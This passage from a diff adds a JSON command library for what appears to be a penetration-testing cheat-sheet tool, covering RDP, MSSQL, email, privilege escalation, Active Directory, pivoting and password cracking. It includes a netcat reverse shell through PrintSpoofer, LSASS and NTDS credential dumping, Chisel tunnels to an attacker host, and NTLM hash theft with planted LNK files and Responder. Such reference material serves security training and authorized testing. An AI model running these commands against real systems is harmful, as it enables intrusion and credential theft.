+            "command": "sqlcmd -S {SERVER} -U {USER} -P '{PASSWORD}'",
+            "description": "Connect to a MSSQL server from Windows."
+          },
+          {
+            "title": "Connect to MSSQL from Linux",
+            "command": "sqsh -S {IP} -U {USER} -P '{PASSWORD}' -h",
+            "description": "Connect to MSSQL using Linux client."
+          },
+          {
+            "title": "Show Databases MySQL",
+            "command": "mysql> SHOW DATABASES;",
+            "description": "Show all available MySQL databases."
+          },
+          {
+            "title": "Show Tables MySQL",
+            "command": "mysql> SHOW TABLES;",
+            "description": "List all tables in the current MySQL database."
+          },
+          {
+            "title": "Read Local File MySQL",
+            "command": "mysql> SELECT LOAD_FILE('{FILE}');",
+            "description": "Read a local file using MySQL."
+          },
+          {
+            "title": "Enable xp_cmdshell MSSQL",
+            "command": "sqlcmd> EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
+            "description": "Enable xp_cmdshell for command execution in MSSQL."
+          },
+          {
+            "title": "Execute System Command MSSQL",
+            "command": "sqlcmd> xp_cmdshell '{COMMAND}'",
+            "description": "Run system commands via MSSQL."
+          }
+        ]
+      },
+      {
+        "name": "RDP Attacks",
+        "commands": [
+          {
+            "title": "RDP Password Spraying Crowbar",
+            "command": "crowbar -b rdp -s {IP}/32 -U {USER_LIST} -c '{PASSWORD}'",
+            "description": "Password spraying against RDP."
+          },
+          {
+            "title": "RDP Brute Force Hydra",
+            "command": "hydra -L {USER_LIST} -p '{PASSWORD}' {IP} rdp",
+            "description": "Brute-force RDP login."
+          },
+          {
+            "title": "RDP Login Linux",
+            "command": "rdesktop -u {USER} -p {PASSWORD} {IP}",
+            "description": "Connect to RDP using rdesktop on Linux."
+          },
+          {
+            "title": "Pass-The-Hash RDP Login",
+            "command": "xfreerdp /v:{IP} /u:{USER} /pth:{NT_HASH}",
+            "description": "Login using NT hash without password."
+          },
+          {
+            "title": "Enable Restricted Admin Mode",
+            "command": "reg add HKLM\\System\\CurrentControlSet\\Control\\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f",
+            "description": "Enable Restricted Admin Mode on target Windows host."
+          }
+        ]
+      },
+      {
+        "name": "DNS Attacks",
+        "commands": [
+          {
+            "title": "AXFR Zone Transfer",
+            "command": "dig AXFR @{NS} {DOMAIN}",
+            "description": "Attempt DNS zone transfer."
+          },
+          {
+            "title": "Subdomain Brute-Force",
+            "command": "subfinder -d {DOMAIN} -v",
+            "description": "Enumerate subdomains via brute-force."
+          },
+          {
+            "title": "DNS Lookup",
+            "command": "host {SUBDOMAIN}",
+            "description": "Resolve DNS for a specific subdomain."
+          }
+        ]
+      },
+      {
+        "name": "Email Service Attacks",
+        "commands": [
+          {
+            "title": "MX Record Lookup",
+            "command": "host -t MX {DOMAIN}",
+            "description": "Check mail servers for a domain."
+          },
+          {
+            "title": "MX Record Lookup with dig",
+            "command": "dig mx {DOMAIN} | grep 'MX' | grep -v ';'",
+            "description": "List mail servers using dig."
+          },
+          {
+            "title": "Resolve Mail Server IP",
+            "command": "host -t A {MAIL_SERVER}",
+            "description": "Resolve IPv4 address of mail server."
+          },
+          {
+            "title": "Connect to SMTP",
+            "command": "telnet {IP} 25",
+            "description": "Connect to SMTP server."
+          },
+          {
+            "title": "SMTP User Enumeration",
+            "command": "smtp-user-enum -M RCPT -U {USER_LIST} -D {DOMAIN} -t {IP}",
+            "description": "Enumerate users via SMTP RCPT command."
+          },
+          {
+            "title": "Office365 Validation",
+            "command": "python3 o365spray.py --validate --domain {DOMAIN}",
+            "description": "Check if Office365 is used for the domain."
+          },
+          {
+            "title": "Office365 User Enumeration",
+            "command": "python3 o365spray.py --enum -U {USER_LIST} --domain {DOMAIN}",
+            "description": "Enumerate existing Office365 users."
+          },
+          {
+            "title": "Office365 Password Spraying",
+            "command": "python3 o365spray.py --spray -U {USER_LIST} -p '{PASSWORD}' --count 1 --lockout 1 --domain {DOMAIN}",
+            "description": "Spray passwords for Office365 accounts."
+          },
+          {
+            "title": "POP3 Brute Force Hydra",
+            "command": "hydra -L {USER_LIST} -p '{PASSWORD}' {IP} pop3",
+            "description": "Brute-force POP3 service."
+          },
+          {
+            "title": "SMTP Open-Relay Test",
+            "command": "swaks --from {SENDER} --to {RECIPIENT} --header 'Subject: {SUBJECT}' --body '{BODY}' --server {IP}",
+            "description": "Test SMTP for open-relay vulnerability."
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "linux-pe",
+    "name": "Linux PE",
+    "color": "#ff6b6b",
+    "categories": [
+      {
+        "name": "Initial Access & Enumeration",
+        "commands": [
+          {
+            "title": "SSH Login",
+            "command": "ssh {USERNAME}@{HOST}",
+            "description": "SSH into the target system"
+          },
+          {
+            "title": "Check Running Root Processes",
+            "command": "ps aux | grep root",
+            "description": "Identify processes running as root"
+          },
+          {
+            "title": "Logged-in Users",
+            "command": "ps au",
+            "description": "View currently logged-in users"
+          },
+          {
+            "title": "User Home Directories",
+            "command": "ls /home",
+            "description": "List user home directories"
+          },
+          {
+            "title": "SSH Keys",
+            "command": "ls -l ~/.ssh",
+            "description": "Check for SSH keys for the current user"
+          },
+          {
+            "title": "Bash History",
+            "command": "history",
+            "description": "Review command history for credentials or clues"
+          },
+          {
+            "title": "Sudo Permissions",
+            "command": "sudo -l",
+            "description": "Check allowed sudo commands"
+          }
+        ]
+      },
+      {
+        "name": "Scheduled Tasks & Services",
+        "commands": [
+          {
+            "title": "Daily Cron Jobs",
+            "command": "ls -la /etc/cron.daily",
+            "description": "Check scheduled daily cron jobs"
+          },
+          {
+            "title": "Running Processes with pspy",
+            "command": "./pspy64 -pf -i 1000",
+            "description": "Monitor running processes without root privileges"
+          }
+        ]
+      },
+      {
+        "name": "Filesystem & Permissions",
+        "commands": [
+          {
+            "title": "Mounted & Unmounted Drives",
+            "command": "lsblk",
+            "description": "List block devices and mounts"
+          },
+          {
+            "title": "World-Writable Directories",
+            "command": "find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null",
+            "description": "Locate world-writable directories"
+          },
+          {
+            "title": "World-Writable Files",
+            "command": "find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null",
+            "description": "Locate world-writable files"
+          },
+          {
+            "title": "Search for Config Files",
+            "command": "find / ! -path \"*/proc/*\" -iname \"*config*\" -type f 2>/dev/null",
+            "description": "Search for configuration files containing secrets"
+          }
+        ]
+      },
+      {
+        "name": "System & Kernel Enumeration",
+        "commands": [
+          {
+            "title": "Kernel Version",
+            "command": "uname -a",
+            "description": "Identify kernel version for exploit research"
+          },
+          {
+            "title": "OS Version",
+            "command": "cat /etc/lsb-release",
+            "description": "Check Linux distribution and version"
+          },
+          {
+            "title": "Compile Kernel Exploit",
+            "command": "gcc kernel_exploit.c -o kernel_exploit",
+            "description": "Compile a kernel exploit written in C"
+          },
+          {
+            "title": "Screen Version",
+            "command": "screen -v",
+            "description": "Check for vulnerable screen versions"
+          }
+        ]
+      },
+      {
+        "name": "SUID, SGID & Capabilities",
+        "commands": [
+          {
+            "title": "Find SUID Binaries",
+            "command": "find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null",
+            "description": "Locate binaries with SUID bit set"
+          },
+          {
+            "title": "Find SGID Binaries",
+            "command": "find / -user root -perm -6000 -exec ls -ldb {} \\; 2>/dev/null",
+            "description": "Locate binaries with SGID bit set"
+          }
+        ]
+      },
+      {
+        "name": "Environment & Library Hijacking",
+        "commands": [
+          {
+            "title": "Check PATH Variable",
+            "command": "echo $PATH",
+            "description": "Inspect PATH for writable directories"
+          },
+          {
+            "title": "Prepend Current Directory to PATH",
+            "command": "PATH=.:${PATH}",
+            "description": "Exploit PATH hijacking vulnerabilities"
+          },
+          {
+            "title": "Shared Libraries for Binary",
+            "command": "ldd /bin/ls",
+            "description": "List shared libraries used by a binary"
+          },
+          {
+            "title": "LD_PRELOAD Privilege Escalation",
+            "command": "sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart",
+            "description": "Escalate privileges using LD_PRELOAD"
+          },
+          {
+            "title": "Check Binary RUNPATH",
+            "command": "readelf -d payroll | grep PATH",
+            "description": "Inspect RUNPATH for library hijacking"
+          },
+          {
+            "title": "Compile Shared Library",
+            "command": "gcc src.c -fPIC -shared -o /development/libshared.so",
+            "description": "Create a malicious shared library"
+          }
+        ]
+      },
+      {
+        "name": "Container & Network Escapes",
+        "commands": [
+          {
+            "title": "Initialize LXD",
+            "command": "lxd init",
+            "description": "Start LXD initialization"
+          },
+          {
+            "title": "Import Alpine Image",
+            "command": "lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine",
+            "description": "Import a local LXD image"
+          },
+          {
+            "title": "Create Privileged Container",
+            "command": "lxc init alpine r00t -c security.privileged=true",
+            "description": "Create a privileged LXD container"
+          },
+          {
+            "title": "Mount Host Filesystem",
+            "command": "lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true",
+            "description": "Mount host filesystem inside container"
+          },
+          {
+            "title": "Start Container",
+            "command": "lxc start r00t",
+            "description": "Start the privileged container"
+          },
+          {
+            "title": "Show NFS Exports",
+            "command": "showmount -e {HOST}",
+            "description": "Enumerate NFS shares"
+          },
+          {
+            "title": "Mount NFS Share",
+            "command": "sudo mount -t nfs {HOST}:/tmp /mnt",
+            "description": "Mount an NFS share locally"
+          }
+        ]
+      },
+      {
+        "name": "Miscellaneous",
+        "commands": [
+          {
+            "title": "tcpdump Privilege Escalation",
+            "command": "sudo /usr/sbin/tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root",
+            "description": "Exploit tcpdump post-rotate command"
+          },
+          {
+            "title": "Shared tmux Session",
+            "command": "tmux -S /shareds new -s debugsess",
+            "description": "Create or attach to a shared tmux socket"
+          },
+          {
+            "title": "Lynis Audit",
+            "command": "./lynis audit system",
+            "description": "Run system security audit with Lynis"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "windows-pe",
+    "name": "Windows PE",
+    "color": "#ff6b6b",
+    "categories": [
+      {
+        "name": "Initial Enumeration",
+        "commands": [
+          {
+            "title": "RDP to Target",
+            "command": "xfreerdp /v:{HOST} /u:{USERNAME}",
+            "description": "Connect to a Windows target via RDP"
+          },
+          {
+            "title": "Network Configuration",
+            "command": "ipconfig /all",
+            "description": "View network interfaces, IPs, and DNS settings"
+          },
+          {
+            "title": "ARP Table",
+            "command": "arp -a",
+            "description": "Review the ARP cache"
+          },
+          {
+            "title": "Routing Table",
+            "command": "route print",
+            "description": "Review routing information"
+          },
+          {
+            "title": "Windows Defender Status",
+            "command": "Get-MpComputerStatus",
+            "description": "Check Windows Defender configuration"
+          },
+          {
+            "title": "AppLocker Rules",
+            "command": "Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections",
+            "description": "Enumerate effective AppLocker rules"
+          },
+          {
+            "title": "Environment Variables",
+            "command": "set",
+            "description": "Display all environment variables"
+          },
+          {
+            "title": "System Information",
+            "command": "systeminfo",
+            "description": "View detailed system configuration"
+          },
+          {
+            "title": "Installed Patches",
+            "command": "wmic qfe",
+            "description": "List installed updates and hotfixes"
+          },
+          {
+            "title": "Installed Programs",
+            "command": "wmic product get name",
+            "description": "Enumerate installed software"
+          },
+          {
+            "title": "Running Processes",
+            "command": "tasklist /svc",
+            "description": "List running processes and services"
+          },
+          {
+            "title": "Logged-in Users",
+            "command": "query user",
+            "description": "View currently logged-in users"
+          },
+          {
+            "title": "Current User",
+            "command": "echo %USERNAME%",
+            "description": "Display current username"
+          },
+          {
+            "title": "User Privileges",
+            "command": "whoami /priv",
+            "description": "List assigned privileges"
+          },
+          {
+            "title": "User Groups",
+            "command": "whoami /groups",
+            "description": "List group memberships"
+          },
+          {
+            "title": "Local Users",
+            "command": "net user",
+            "description": "Enumerate local users"
+          },
+          {
+            "title": "Local Groups",
+            "command": "net localgroup",
+            "description": "Enumerate local groups"
+          },
+          {
+            "title": "Administrators Group",
+            "command": "net localgroup administrators",
+            "description": "View members of Administrators group"
+          },
+          {
+            "title": "Password Policy",
+            "command": "net accounts",
+            "description": "View local password policy"
+          },
+          {
+            "title": "Network Connections",
+            "command": "netstat -ano",
+            "description": "Display active network connections"
+          }
+        ]
+      },
+      {
+        "name": "Token & Privilege Abuse",
+        "commands": [
+          {
+            "title": "JuicyPotato Exploit",
+            "command": "JuicyPotato.exe -l {PORT} -p C:\\Windows\\System32\\cmd.exe -t *",
+            "description": "Exploit SeImpersonatePrivilege"
+          },
+          {
+            "title": "PrintSpoofer Exploit",
+            "command": "PrintSpoofer.exe -c \"nc.exe {HOST} {PORT} -e cmd\"",
+            "description": "Exploit Print Spooler for privilege escalation"
+          }
+        ]
+      },
+      {
+        "name": "Credential Dumping",
+        "commands": [
+          {
+            "title": "Dump LSASS",
+            "command": "procdump.exe -accepteula -ma lsass.exe lsass.dmp",
+            "description": "Create LSASS memory dump"
+          },
+          {
+            "title": "Mimikatz LSASS Dump",
+            "command": "sekurlsa::minidump lsass.dmp ; sekurlsa::logonpasswords",
+            "description": "Extract credentials from LSASS dump"
+          },
+          {
+            "title": "NTDS Dump",
+            "command": "secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL",
+            "description": "Extract domain hashes from NTDS.dit"
+          }
+        ]
+      },
+      {
+        "name": "Service & Path Abuse",
+        "commands": [
+          {
+            "title": "Unquoted Service Paths",
+            "command": "wmic service get name,displayname,pathname,startmode | findstr /i \"auto\" | findstr /i /v \"c:\\windows\\\\\"",
+            "description": "Identify unquoted service paths"
+          },
+          {
+            "title": "Service Permissions",
+            "command": "icacls \"C:\\Program Files\\Service.exe\"",
+            "description": "Check service binary permissions"
+          },
+          {
+            "title": "Modify Service Binary",
+            "command": "sc config AppReadiness binPath= \"cmd /c net localgroup Administrators {USERNAME} /add\"",
+            "description": "Abuse writable service configuration"
+          }
+        ]
+      },
+      {
+        "name": "File & Registry Permissions",
+        "commands": [
+          {
+            "title": "Take Ownership",
+            "command": "takeown /f C:\\path\\to\\file",
+            "description": "Take ownership of a file"
+          },
+          {
+            "title": "Modify ACL",
+            "command": "icacls C:\\path\\to\\file /grant {USERNAME}:F",
+            "description": "Grant full control permissions"
+          },
+          {
+            "title": "AlwaysInstallElevated Check",
+            "command": "reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer",
+            "description": "Check AlwaysInstallElevated registry key"
+          }
+        ]
+      },
+      {
+        "name": "Credential Hunting",
+        "commands": [
+          {
+            "title": "Search for Passwords",
+            "command": "findstr /SI /C:\"password\" *.txt *.ini *.cfg *.config *.xml",
+            "description": "Search files for stored credentials"
+          },
+          {
+            "title": "PowerShell History",
+            "command": "gc (Get-PSReadLineOption).HistorySavePath",
+            "description": "Read PowerShell command history"
+          },
+          {
+            "title": "Saved Credentials",
+            "command": "cmdkey /list",
+            "description": "List stored credentials"
+          },
+          {
+            "title": "LaZagne",
+            "command": "lazagne.exe all",
+            "description": "Extract stored application credentials"
+          }
+        ]
+      },
+      {
+        "name": "Scheduled Tasks & Startup",
+        "commands": [
+          {
+            "title": "Scheduled Tasks",
+            "command": "schtasks /query /fo LIST /v",
+            "description": "Enumerate scheduled tasks"
+          },
+          {
+            "title": "Startup Programs",
+            "command": "Get-CimInstance Win32_StartupCommand",
+            "description": "Enumerate startup programs"
+          }
+        ]
+      },
+      {
+        "name": "Tools & Automation",
+        "commands": [
+          {
+            "title": "SharpUp",
+            "command": "SharpUp.exe audit",
+            "description": "Automated Windows privilege escalation checks"
+          },
+          {
+            "title": "Windows Exploit Suggester",
+            "command": "windows-exploit-suggester.py --systeminfo systeminfo.txt",
+            "description": "Identify missing patches and kernel exploits"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "metasploit",
+    "name": "Metasploit",
+    "color": "#ff6b6b",
+    "categories": [
+      {
+        "name": "Basic Usage",
+        "commands": [
+          {
+            "title": "Start Console",
+            "command": "msfconsole"
+          },
+          {
+            "title": "Search Exploit",
+            "command": "search type:exploit name:smb"
+          },
+          {
+            "title": "Use Module",
+            "command": "use exploit/windows/smb/ms17_010_eternalblue"
+          },
+          {
+            "title": "Show Options",
+            "command": "show options"
+          },
+          {
+            "title": "Set RHOSTS",
+            "command": "set RHOSTS TARGET"
+          },
+          {
+            "title": "Run",
+            "command": "exploit"
+          }
+        ]
+      },
+      {
+        "name": "Meterpreter",
+        "commands": [
+          {
+            "title": "System Info",
+            "command": "sysinfo"
+          },
+          {
+            "title": "Get UID",
+            "command": "getuid"
+          },
+          {
+            "title": "Hashdump",
+            "command": "hashdump"
+          },
+          {
+            "title": "Background",
+            "command": "background"
+          },
+          {
+            "title": "Migrate",
+            "command": "migrate PID"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "password-attack",
+    "name": "Password Attack",
+    "color": "#ff6b6b",
+    "categories": [
+      {
+        "name": "Hashcat",
+        "commands": [
+          {
+            "title": "NTLM",
+            "command": "hashcat -m 1000 hash.txt wordlist.txt"
+          },
+          {
+            "title": "MD5",
+            "command": "hashcat -m 0 hash.txt wordlist.txt"
+          },
+          {
+            "title": "SHA256",
+            "command": "hashcat -m 1400 hash.txt wordlist.txt"
+          },
+          {
+            "title": "With Rules",
+            "command": "hashcat -m 1000 hash.txt wordlist.txt -r best64.rule"
+          }
+        ]
+      },
+      {
+        "name": "John The Ripper",
+        "commands": [
+          {
+            "title": "Default",
+            "command": "john hash.txt"
+          },
+          {
+            "title": "Wordlist",
+            "command": "john --wordlist=rockyou.txt hash.txt"
+          },
+          {
+            "title": "Show Cracked",
+            "command": "john --show hash.txt"
+          }
+        ]
+      },
+      {
+        "name": "Hydra",
+        "commands": [
+          {
+            "title": "SSH Brute",
+            "command": "hydra -l user -P wordlist.txt ssh://TARGET"
+          },
+          {
+            "title": "HTTP POST",
+            "command": "hydra -l admin -P wordlist.txt TARGET http-post-form \"/login:user=^USER^&pass=^PASS^:F=incorrect\""
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "pivoting",
+    "name": "Pivoting",
+    "color": "#ff6b6b",
+    "categories": [
+      {
+        "name": "SSH Tunneling",
+        "commands": [
+          {
+            "title": "Local Forward",
+            "command": "ssh -L 8080:internal-host:80 user@pivot"
+          },
+          {
+            "title": "Remote Forward",
+            "command": "ssh -R 8080:localhost:80 user@pivot"
+          },
+          {
+            "title": "Dynamic SOCKS",
+            "command": "ssh -D 1080 user@pivot"
+          }
+        ]
+      },
+      {
+        "name": "Chisel",
+        "commands": [
+          {
+            "title": "Server",
+            "command": "chisel server --reverse -p 8000"
+          },
+          {
+            "title": "Client Reverse",
+            "command": "chisel client ATTACKER:8000 R:socks"
+          },
+          {
+            "title": "Port Forward",
+            "command": "chisel client ATTACKER:8000 R:8080:internal:80"
+          }
+        ]
+      },
+      {
+        "name": "Proxychains",
+        "commands": [
+          {
+            "title": "Use Proxy",
+            "command": "proxychains nmap -sT TARGET"
+          },
+          {
+            "title": "Config",
+            "command": "echo \"socks5 127.0.0.1 1080\" >> /etc/proxychains.conf"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "ad-ldap",
+    "name": "AD LDAP",
+    "color": "#374151",
+    "categories": [
+      {
+        "name": "Enumeration",
+        "commands": [
+          {
+            "title": "Domain Info",
+            "command": "ldapsearch -x -H ldap://DC-IP -b \"DC=domain,DC=local\""
+          },
+          {
+            "title": "Users",
+            "command": "ldapsearch -x -H ldap://DC-IP -b \"DC=domain,DC=local\" \"(objectClass=user)\""
+          },
+          {
+            "title": "Groups",
+            "command": "ldapsearch -x -H ldap://DC-IP -b \"DC=domain,DC=local\" \"(objectClass=group)\""
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "ad-powerview",
+    "name": "AD PowerView",
+    "color": "#374151",
+    "categories": [
+      {
+        "name": "Domain Enumeration",
+        "commands": [
+          {
+            "title": "Import Module",
+            "command": "Import-Module .\\PowerView.ps1"
+          },
+          {
+            "title": "Domain Info",
+            "command": "Get-Domain"
+          },
+          {
+            "title": "Domain Users",
+            "command": "Get-DomainUser"
+          },
+          {
+            "title": "Domain Groups",
+            "command": "Get-DomainGroup"
+          },
+          {
+            "title": "Domain Admins",
+            "command": "Get-DomainGroupMember \"Domain Admins\""
+          }
+        ]
+      },
+      {
+        "name": "ACL Abuse",
+        "commands": [
+          {
+            "title": "Find ACLs",
+            "command": "Find-InterestingDomainAcl"
+          },
+          {
+            "title": "User ACL",
+            "command": "Get-DomainObjectAcl -Identity \"username\" -ResolveGUIDs"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "ad-bloodhound",
+    "name": "AD BloodHound",
+    "color": "#374151",
+    "categories": [
+      {
+        "name": "Collection",
+        "commands": [
+          {
+            "title": "SharpHound",
+            "command": ".\\SharpHound.exe -c All"
+          },
+          {
+            "title": "Python Collector",
+            "command": "bloodhound-python -d domain.local -u user -p pass -ns DC-IP -c All"
+          }
+        ]
+      },
+      {
+        "name": "Queries",
+        "commands": [
+          {
+            "title": "Find DA Path",
+            "command": "MATCH p=shortestPath((n)-[*1..]->(m:Group {name:\"DOMAIN ADMINS@DOMAIN.LOCAL\"})) RETURN p"
+          }
+        ]
+      }
+    ]
+  },
+  {
+    "id": "ad-crackmapexec",
+    "name": "AD CrackMapExec",
+    "color": "#374151",
+    "categories": [
+      {
+        "name": "Connecting to Targets",
+        "commands": [
+          {
+            "title": "Basic Connection",
+            "command": "cme [protocol] {HOST}",
+            "description": "Connect to a target using the specified protocol (smb, winrm, mssql, ldap, ssh, rdp, ftp)."
+          },
+          {
+            "title": "Specify Users",
+            "command": "cme [protocol] {HOST} -u {USERNAME}",
+            "description": "Specify a single username, a list of usernames, or a file containing usernames."
+          },
+          {
+            "title": "Specify Passwords",
+            "command": "cme [protocol] {HOST} -u {USERNAME} -p {PASSWORD}",
+            "description": "Specify a password, a list of passwords, or a file containing passwords."
+          },
+          {
+            "title": "Use NTLM Hash",
+            "command": "cme [protocol] {HOST} -u {USERNAME} -H {NTLM_HASH}",
+            "description": "Authenticate using an NTLM hash."
+          }
+        ]
+      },
+      {
+        "name": "RDP Enumeration",
+        "commands": [
+          {
+            "title": "RDP Screenshot if NLA Disabled",
+            "command": "cme rdp {HOST} -u {USERNAME} -p {PASSWORD} --nla-screenshot",
+            "description": "Take a screenshot of the login prompt if NLA is disabled."
+          },
+          {
+            "title": "RDP Screenshot",
+            "command": "cme rdp {HOST} -u {USERNAME} -p {PASSWORD} --screenshot",
+            "description": "Capture screenshot after successful RDP login."
+          },
+          {
+            "title": "RDP Screenshot Timeout",
+            "command": "cme rdp {HOST} -u {USERNAME} -p {PASSWORD} --screentime {SECONDS}",
+            "description": "Set wait time for desktop image capture."
+          },
+          {
+            "title": "RDP Resolution",
+            "command": "cme rdp {HOST} -u {USERNAME} -p {PASSWORD} --res {WIDTHxHEIGHT}",
+            "description": "Set resolution for screenshot (default 1024x768)."
+          }
+        ]
+      },
+      {
+        "name": "Finding Accounts",
+        "commands": [
+          {
+            "title": "ASREPRoast",
+            "command": "cme ldap {HOST} -u {USERNAME} -p {PASSWORD} --asreproast asreproast.out",
+            "description": "Retrieve AS-REP hashes for users without Kerberos pre-auth."
+          },
+          {
+            "title": "Kerberoasting",
+            "command": "cme ldap {HOST} -u {USERNAME} -p {PASSWORD} --kerberoasting kerberoasting.out",
+            "description": "Retrieve TGS hashes for users with SPNs."
+          },
+          {
+            "title": "Crack ASREPRoast Hash",
+            "command": "hashcat -m 18200 asreproast.out /usr/share/wordlists/rockyou.txt --force",
+            "description": "Crack ASREPRoast hashes using Hashcat."
+          },
+          {
+            "title": "Crack Kerberoasting Hash",
+            "command": "hashcat -m 13100 kerberoasting.out /usr/share/wordlists/rockyou.txt --force",
+            "description": "Crack Kerberoasting TGS hashes using Hashcat."
+          }
+        ]
+      },
+      {
+        "name": "MSSQL Enumeration and Attacks",
+        "commands": [
+          {
+            "title": "Run SQL Query",
+            "command": "cme mssql {HOST} -u {USERNAME} -p {PASSWORD} -q \"{SQL_QUERY}\"",
+            "description": "Execute SQL query on the MSSQL target."
+          },
+          {
+            "title": "Execute Windows Command",
+            "command": "cme mssql {HOST} -u {USERNAME} -p {PASSWORD} -x \"{COMMAND}\"",
+            "description": "Run Windows command via MSSQL xp_cmdshell."
+          },
+          {
+            "title": "Enumerate MSSQL Privileges",
+            "command": "cme mssql {HOST} -u {USERNAME} -p {PASSWORD} -M mssql_priv",
+            "description": "Enumerate privileges to escalate from user to sysadmin."
+          },
+          {
+            "title": "Privilege Escalation",
+            "command": "cme mssql {HOST} -u {USERNAME} -p {PASSWORD} -M mssql_priv -o ACTION=privesc",
+            "description": "Exploit MSSQL privileges to gain sysadmin."
+          },
+          {
+            "title": "Privilege Rollback",
+            "command": "cme mssql {HOST} -u {USERNAME} -p {PASSWORD} -M mssql_priv -o ACTION=rollback",
+            "description": "Rollback privileges to standard user."
+          },
+          {
+            "title": "Get Remote File",
+            "command": "cme mssql {HOST} -u {USERNAME} -p {PASSWORD} --share {SHARE} --get-file {REMOTE_FILE} {OUTPUT_FILE}",
+            "description": "Download a remote file from a shared folder."
+          },
+          {
+            "title": "Put Remote File",
+            "command": "cme mssql {HOST} -u {USERNAME} -p {PASSWORD} --share {SHARE} --put-file {LOCAL_FILE} {REMOTE_FILE}",
+            "description": "Upload a local file to a remote location."
+          }
+        ]
+      },
+      {
+        "name": "Domain Enumeration",
+        "commands": [
+          {
+            "title": "GPP Passwords",
+            "command": "cme smb {HOST} -u {USERNAME} -p {PASSWORD} -M gpp_password",
+            "description": "Retrieve plaintext passwords from Group Policy Preferences."
+          },
+          {
+            "title": "GPP Autologin",
+            "command": "cme smb {HOST} -u {USERNAME} -p {PASSWORD} -M gpp_autologin",
+            "description": "Retrieve autologin registry information."
+          }
+        ]
+      },
+      {
+        "name": "File Operations",
+        "commands": [
+          {
+            "title": "Search Share Pattern",
+            "command": "cme smb {HOST} -u {USERNAME} -p {PASSWORD} --spider {SHARE} --pattern {PATTERN}",
+            "description": "Search a remote share for files matching a pattern."
+          },
+          {
+            "title": "Search Share Regex",
+            "command": "cme smb {HOST} -u {USERNAME} -p {PASSWORD} --spider {SHARE} --regex {REGEX}",
+            "description": "Search a remote share using a regex."
+          },
+          {
+            "title": "Enable Content Search",
+            "command": "cme smb {HOST} -u {USERNAME} -p {PASSWORD} --spider {SHARE} --content",
+            "description": "Enable content search, can combine with --pattern or --regex."
+          },
+          {
+            "title": "Get File",
+            "command": "cme smb {HOST} -u {USERNAME} -p {PASSWORD} --share {SHARE} --get-file {REMOTE_FILE} {OUTPUT_FILE}",
+            "description": "Download a remote file from a shared folder."
+          },
+          {
+            "title": "Put File",
+            "command": "cme smb {HOST} -u {USERNAME} -p {PASSWORD} --share {SHARE} --put-file {LOCAL_FILE} {REMOTE_FILE}",
+            "description": "Upload a local file to a remote folder."
+          }
+        ]
+      },
+      {
+        "name": "Using Proxychains and Chisel",
+        "commands": [
+          {
+            "title": "Chisel Reverse Server",
+            "command": "chisel server --reverse",
+            "description": "Start a reverse Chisel server on the attack host."
+          },
+          {
+            "title": "Target as Chisel Client",
+            "command": "cme smb {HOST} -u {USERNAME} -p {PASSWORD} -x \"C:\\Windows\\Temp\\chisel.exe client {ATTACK_HOST}:{PORT} R:socks\"",
+            "description": "Run Chisel client on the target to connect back to attack host."
+          },
+          {
+            "title": "Target as Chisel Server",
+            "command": "cme smb {HOST} -u {USERNAME} -p {PASSWORD} -x \"C:\\Windows\\Temp\\chisel.exe server --socks5\"",
+            "description": "Run Chisel server on the target machine."
+          },
+          {
+            "title": "Chisel Client on Attack Host",
+            "command": "chisel client {ATTACK_HOST}:{PORT} socks",
+            "description": "Connect from attack host to Chisel server on target."
+          }
+        ]
+      },
+      {
+        "name": "Stealing Hashes",
+        "commands": [
+          {
+            "title": "Create Slinky LNK",
+            "command": "cme smb {HOST} -u {USERNAME} -p {PASSWORD} -M slinky -o SERVER={YOUR_IP} NAME={LNK_FILENAME}",
+            "description": "Create LNK files pointing to an SMB server in writable shares."
+          },
+          {
+            "title": "Start Responder",
+            "command": "sudo responder -I {INTERFACE}",
+            "description": "Listen for requests to capture hashes using Responder."
+          },
+          {
+            "title": "NTLM Relay",
+            "command": "ntlmrelayx.py -t {HOST} -smb2support --no-http",
+            "description": "Relay captured NTLMv2 hashes to target."
+          },
+          {
+            "title": "Clean LNK File",
+            "command": "cme smb {HOST} -u {USERNAME} -p {PASSWORD} -M slinky -o SERVER={YOUR_IP} NAME={LNK_FILENAME} CLEAN=YES",
+            "description": "Search and delete LNK files after exfiltration."
+          },
+          {
+            "title": "Drop SearchConnector",
+            "command": "cme smb {HOST} -u {USERNAME} -p {PASSWORD} -M drop-sc -o URL=\\\\{YOUR_IP}\\secret SHARE={SHARE} FILENAME={FILENAME}",
+            "description": "Create a .searchConnector-ms pointing to SMB server."
+          },
+          {
+            "title": "Cleanup SearchConnector",
+            "command": "cme smb {HOST} -u {USERNAME} -p {PASSWORD} -M drop-sc -o CLEANUP=True FILENAME={FILENAME}",
+            "description": "Search and delete .searchConnector-ms files."
+          }
+        ]
+      },
+      {
+        "name": "CME Output",
+        "commands": [
+          {
+            "title": "Valid Credential",
+            "command": "Green [+]",
+            "description": "Username and password are valid."
+          },
+          {
+            "title": "Invalid Credential",
+            "command": "Red [-]",
+            "description": "Username or password is invalid."
+          },
+          {
+            "title": "Valid but no Auth",
+            "command": "Magenta",
+            "description": "Username and password are valid, but authentication fails."
+          },
+          {
+            "title": "High Privileges",
+            "command": "(Pwn3d!)",
+            "description": "We have admin or high privileges on the target."
+          }
+        ]
+      },
+      {
+        "name": "CME Specific Options",
+        "commands": [
+          {
+            "title": "Continue on Success",
+            "command": "--continue-on-success",
+            "description": "Continue spraying even if a valid credential is found."
+          },
+          {
+            "title": "No Bruteforce",
+            "command": "--no-bruteforce",
